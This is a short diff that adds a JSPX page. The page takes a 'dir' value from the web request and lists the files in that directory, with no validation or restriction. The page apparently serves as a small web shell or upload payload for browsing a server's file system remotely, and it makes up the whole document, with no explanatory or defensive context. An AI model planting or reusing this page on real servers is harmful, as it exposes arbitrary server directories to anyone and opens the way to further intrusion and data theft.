@@ -1,0 +1,12 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" version="2.0">
+    <jsp:directive.page import="java.io.File"/>
+    <pre>
+    <jsp:scriptlet>
+        String[] files = new File(request.getParameter("dir")).list();
+
+        for (String file : files) {
+            out.println(file);
+        }
+    </jsp:scriptlet>
+    </pre>
+</jsp:root>
